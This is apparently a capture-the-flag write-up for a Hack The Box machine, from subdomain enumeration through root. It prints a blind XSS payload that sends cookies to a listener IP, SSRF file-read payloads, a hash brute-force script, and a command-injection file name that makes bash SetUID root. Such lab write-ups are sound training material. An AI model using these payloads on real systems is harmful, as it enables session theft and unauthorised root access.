### Initial Recon and Enumeration

My initial nmap scan revealed only two open ports. To be on the safe side, I added a quick udp scan to be thorough, but found no open ports. My only entrances are ports 22 and 80. I add the host name that I got from my nmap scan to `/etc/hosts` and began subdomain and directory enumeration. 

```
ffuf -u http://comprezzor.htb -H 'Host: FUZZ.comprezzor.htb' -w /usr/share/wordlists/subdomains/n0kovo_subdomains/n0kovo_subdomains_large.txt -fs 178
```

Subdomain enumeration revealed auth, dashboard, and report.

```
ffuf -u http://dashboard.comprezzor.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -e ".php,.html,.txt"
```

Directory enumeration on the dashboard subdomain found the directory `/backup`.

I did a few more scans, and while they finished up I started looking at the the subdomains. Auth had a login portal, which I threw some weak usernames and passwords into to no avail. I registered a user for the site here. Dashboard was unavailable, and report had a submission form once I logged in with the user I registered earlier. The submission form seemed like my best bet, so I switched over to Burp and started messing with it. 

### Cookie Investigation and Blind XSS Attack

After looking through the requests and responses I noticed something interesting.

Request:
```
Set-Cookie: user_data=eyJ1c2VyX2lkIjogNiwgInVzZXJuYW1lIjogImdheSIsICJyb2xlIjogInVzZXIifXxlMGY3OTczMzlmNzM2YjNhNmYyYjk5ODYwOWEyYjc2MmU3N2Y1MmZkODdiYzEwYmFjY2Q4N2JlMDRkZDNiMDQ4; Domain=.comprezzor.htb; Path=/
```

Response:
```
Set-Cookie: session=.eJwtyzEOgzAMRuGr_PVc9QCMvQAHQKhKUkOiGqhiWwgh7g4D0xs-vZ0-gwTNrNR0O8GukHpKrEpPevuIyv-lGtTjVMz4i5sHF9keaL3COExYiwgiI2VOvzKPWGZYLgrN1y_bi_qjP07Z8SiE.Zi8C8g.q_CJvbfdfNtdejRyqzqrzvpOiN4; Domain=.comprezzor.htb; HttpOnly; Path=/
```

The `HttpOnly` flag is set on cookies to tell the browser that the cookie should only be accessible through **HTTP(S)** requests and should not be available to client-side scripts (like JavaScript). This means that if the flag is not set, the browser could expose the cookie. If a session cookie is accessible to JavaScript I can steal a user's session cookie with an XSS attack and impersonate them. I used a payload from [this github repository](https://github.com/lauritzh/blind-xss-payloads). This is a blind XSS so I'll need to have a listener set up to catch the cookie.

```
python3 -m http.server 8000
```

First I tried a simple get.

```
<img src="http://10.10.14.2:8000">
```

I got a request from the server, so I moved on to stealing the cookie.

```
<img src=x onerror="fetch('http://10.10.14.8:8000/?c='+btoa(/document.cookie))">
```

It didn't work, so I tried URL encoding it.

```
<img+src%3dx+onerror%3dfetch('http%3a//10.10.14.2%3a8000%3fc%3d'%2bbtoa(document.cookie))>
```

Success! 

Adam Token:
```
user_data=eyJ1c2VyX2lkIjogMiwgInVzZ...............................
```

Now I can access the dashboard page. My user can create, elevate, delete, and complete reports. I assume that the admin, or maybe just a higher privileged user, is the one who sees the elevated reports. Sounds interesting. From there I create a report containing a familiar XSS, elevate the priority of the report, start a listener and catch the administrator's cookie. 

Admin Token:
```
user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJ.................................
```

Excellent! I refresh the page with my new cookie, and I'm off to the races.

### SSRF Exploit Using wkhtmltopdf and urllib

The admin has access to some interesting tools. I can create a report of any website I point the site at. I do exactly that by pointing it at my local python server, and get a PDF back on my browser. Neat! I stalled here for a bit, unsure of how this was going to help me. Eventually I remembered that exiftool exists, and got some very good information out of the PDF's metadata.

```
exiftool /home/kali/Downloads/report_31784.pdf 
```

Exiftool reveals that the tool that was used to convert the HTML to a pdf, wkhtmltopdf 0.12.6, contains a server side request forgery vulnerability (SSRF). This is interesting, but we actually can't make use of this SSRF due to the server filtering URL's before sending requests. 

Hack The Box machines don't have access to the internet, so the only things I can point it at are itself and me. It doesn't want to see itself, so I kept making it look at me. I set up a netcat listener and caught the response again, revealing the user agent Python-urllib 3.11. This version has a vulnerability, [CVE-2023-24329](https://pointernull.com/security/python-url-parse-problem.html) , which improperly sanitizes inputs. This allowed me to bypass the server's URL filtering and make use of the SSRF from earlier.

```
report_url=+file%3A%2F%2F§§
```

I used Burp Suite Intruder with a Linux LFI wordlist to enumerate files via this SSRF. I got a ton of information back, but most of it was junk. These few files seemed most interesting to me.

```
 file:///proc/self/cmdline
 file:///app/code/app.py
 file:///app/code/blueprints/dashboard/dashboard.py
 file:///app/code/blueprints/report/report.py
 file:///app/code/blueprints/index/index.py 
```

I got to work digging around in the files with the help of the SSRF, and found some very interesting snippets.

app/code/app.py:
```
app.secret_key = "7ASS7A............."
```

I wasn't quite sure what this was for, so I kept going.

/app/code/blueprints/dashboard/dashboard.py:
```
'Cookie': 'user_data=eyJ1c2VyX2lkIjogMSwgIn.............................'
```

I had already gotten an admin cookie, so another cookie seemed moot. I kept digging.

/app/code/blueprints/dashboard/dashboard.py:
```
ftp.login(user='ftp_admin', passwd='u3j..........')
```

This is more like it! However, there's no ftp port open to me. Instead, I'll try this in the report url field with the SSRF.

```
 ftp://ftp_admin:u3j........@ftp.local/
```

The resulting pdf shows us a welcome note and an rsa key. I then use the same vulnerability to copy both files. The welcome note contains the passphrase needed to access the private key.  

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDyIVwjHg
cDQsuL69cF7BJpAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQDfUe6nu6ud
KETqHA3v4sOjhIA4sxSwJOpWJsS//l6KBOcHRD6qJiFZeyQ5NkHiEKPIEfsHuFMzykx8lA
.................................................
ci+lAtzdlOEAI6unVp8DiIdOeprpLnTBDHCe3+k3BD6tyOR0PsxIqL9C4om4G16cOaw9Lu
nCzj61Uyn4PfHjPlCfb0VfzrM+hkXus+m0Oq4DccwahrnEdt5qydghYpWiMgfELtQ2Z3W6
XxwXArPr6+HQe9hZSjI2hjYC2OU=
-----END OPENSSH PRIVATE KEY-----
```

I quickly changed the passphrase to something easier to type, and found a comment that gave me the associated account.

```
ssh-keygen -p -f ./adam_id_rsa -N test -P 'Y27S..........'
```

I then logged in via the open SSH port using the private key. 

### Network and File System Exploration

Once I got inside I looked at the internally accessible ports. I did this because the FTP port had been internal and I wanted to see what else was hiding.

```
netstat -antop
```

This revealed several TCP ports that were being used as internal web servers. Unfortunately for me, my socks proxy wasn't working (unsure why this was the case) so I had to port forward each of them individually to search around.

```
ssh dev_acc@comprezzor.htb -i openssh.key -L 4444:127.0.0.1:4444  
```

```
ssh dev_acc@comprezzor.htb -i openssh.key -L 7900:172.21.0.4:7900 
```

Unfortunately this seemed to be a rabbit hole. I messed around with the Selenium dashboard on port 4444 for a while but didn't find anything useful. 

I then flicked through the directories I had found earlier. To my delight, I found a directory containing db files. I opened up sqlite3 and viewed the contents. There I discovered two password hashes, one for the admin and one for adam, which I promptly threw into hashcat. The admin hash did not crack, but adam's did. 

```
adam::ad...........
```

I tried logging into the exposed SSH port with the credentials I found, but came up empty handed. After a little head scratching, I remembered the internal ftp port from earlier, and tested the credentials there. 

```
ftp adam@127.0.0.1
```

The credentials worked, and I found two directories inside. One contained three files; a shell script, an executable, and a C project.  

```
run-tests.sh
runner1
runner1.c
```

### Runner1

An authorization key hash and an incomplete key are exposed in the c project, and the number of missing characters is revealed in run-tests.sh. I can easily crack the hash with a simple python script given these variables.

```
import hashlib
import random
import string

# Hardcoded input strings
md5_hash = "0feda17076d793c2ef2870d7427ad4ed"
incomplete_password = "UHI75GHI"

def generate_random_chars(length):
    """Generate a random string of ASCII characters and numbers."""
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def find_matching_chars(md5_hash, incomplete_password):
    """Find the 4 characters that make the MD5 hashes match."""
    while True:
        random_chars = generate_random_chars(4)
        password_attempt = incomplete_password + random_chars
        hashed_attempt = hashlib.md5(password_attempt.encode()).hexdigest()
        if hashed_attempt == md5_hash:
            return random_chars

matching_chars = find_matching_chars(md5_hash, incomplete_password)
print("Matching characters:", matching_chars)
```

The key cracks in no time at all!

```
UHI75GHI....
```

But what to do with it? I really only looked skin deep into the C project, and didn't really fully understand what it was for. Upon closer inspection, I deduce that the C project serves as a command-line tool to manage Ansible playbooks. It can list available Ansible playbooks, run a specific Ansible playbook based on its number in the list, and install Ansible roles from a specified URL. 

An Ansible playbook is a YAML file that defines a set of tasks to be executed on remote servers or systems. It automates configuration management, application deployment, and other IT tasks. The program scans the /opt/playbooks/ directory for .yml files, which are assumed to be Ansible playbooks. This allows users to see which automation scripts are available. Users can then select a playbook by its number in the list, and the program will execute it using the ansible-playbook command. This automates the execution of predefined tasks on the target systems defined in the inventory.ini file. 

This seems somewhat useful. Sounds like it's time for a trip to `/opt/playbooks`. Unfortunately, I can't access that directory, nor can I access the other interesting directory I found in `/opt`, `runner2`. My user is not of the group sys-adm. This could have been a very elaborate rabbit hole. 

### Privilege Escalation and Exploiting Runner2

I decided to keep sifting through the directories. It took me longer than I'd like to admit to find `/var/log/suricata`, but regardless, progress was made! Suricata is designed to monitor network traffic and identify suspicious activities based on defined rules. As it so happens, it also creates a lot of logs that might contain juicy information. I wrote a quick bash script to unzip and export them to my user's home directory. 

```
for f in *.gz; do
  STEM=$(basename "${f}" .gz)
  gunzip -c "${f}" > /home/dev_acc/"${STEM}"
done
```

I poured over the logs, and found some very handy plaintext credentials! At this point I had been stuck on the same user for hours, so this was extremely satisfying. 

```
lopez::Lo............
```

I kissed dev_acc goodbye and quickly pivoted to lopez's account.

```
ssh lopez@comprezzor.htb
```

My first order of business was checking my group, and sure enough I was in sys-adm! I then checked my sudo permissions, finding that I could run runner2 as root. Thank goodness, my earlier work wasn't a complete waste of time. I opened up the runner2 directory and tried to run the program for usage. Unfortunately it didn't give me anything to work with. I then used strings to pull the usage out of it. I was actually very pleasantly surprised by the results. 

```
Invalid tar archive.                                                           
/usr/bin/ansible-galaxy                                                        
%s install %s                           
/opt/playbooks/                  
Failed to open the playbook directory                                          
.yml                                    
%d: %s                                       
/opt/playbooks/inventory.ini     
/usr/bin/ansible-playbook                           
%s -i %s %s%s           
Usage: %s <json_file>          
Failed to open the JSON file
Error parsing JSON data.
action                    
list                    
auth_code                                  
Authentication key missing or invalid for 'run' action.
Invalid playbook number.        
Invalid 'num' value for 'run' action.
install                              
role_file
Authentication key missing or invalid for 'install' action.
Role File missing or invalid for 'install' action.
```

This is all very interesting. Assuming that this application was written in C, %s means that the application directly implements user input. However, it seems that the only way to do so is by supplying the application with a JSON file, the format of which I do not know. I'll have to decompile the application for further inspection. I download the application and use Ghidra to see what its hiding. 

I am by no means a crack reverse engineer, so this was a lot of guesswork. I even reached out to some friends and family who are more knowledgeable of C and reverse engineering for help. After a whole lot of deduction, I figure out that the format of the JSON file I'll need to use for this exploit is something like this:

```
{
  "run": {
    "action": "install",
    "role_file": "command injection"
  },
  "auth_code": "UHI75GHI.... (auth code from runner1)"
}
```

Now that I have the format figured out, I try to inject commands to chown bash as root and put a SetUID on it. 

```
{
  "run": {
    "action": "install",
    "role_file": "test;chown root bash;chmod +s bash;"
  },
  "auth_code": "UHI75GHI...."
}
```

This didn't work, the program needs a valid compressed file in the role_file field. However, if I make a compressed file and name it with the commands I need, it might pass the check.

```
tar cvf i.tar .
cp i.tar 'test;chown root bash;chmod +s bash;t.tar'
```

I add the file name to my JSON file.

```
vim test.json
```

```
{
  "run": {
    "action": "install",
    "role_file": "test;chown root bash;chmod +s bash;t.tar"
  },
  "auth_code": "UHI75GHI...."
}
```

Finally I test if the exploit worked by copying bash to my current directory, making is executable, running the runner2 application as root, and using the -p flag on bash.

```
cp /bin/bash .
chmod +x ./bash
sudo /opt/runner2/runner2 test.json 
./bash -p
```

I now effectively have a root shell, and am very pleased to be able to get the root flag. 

```
cat /root/root.txt
```

This one was a doozy.
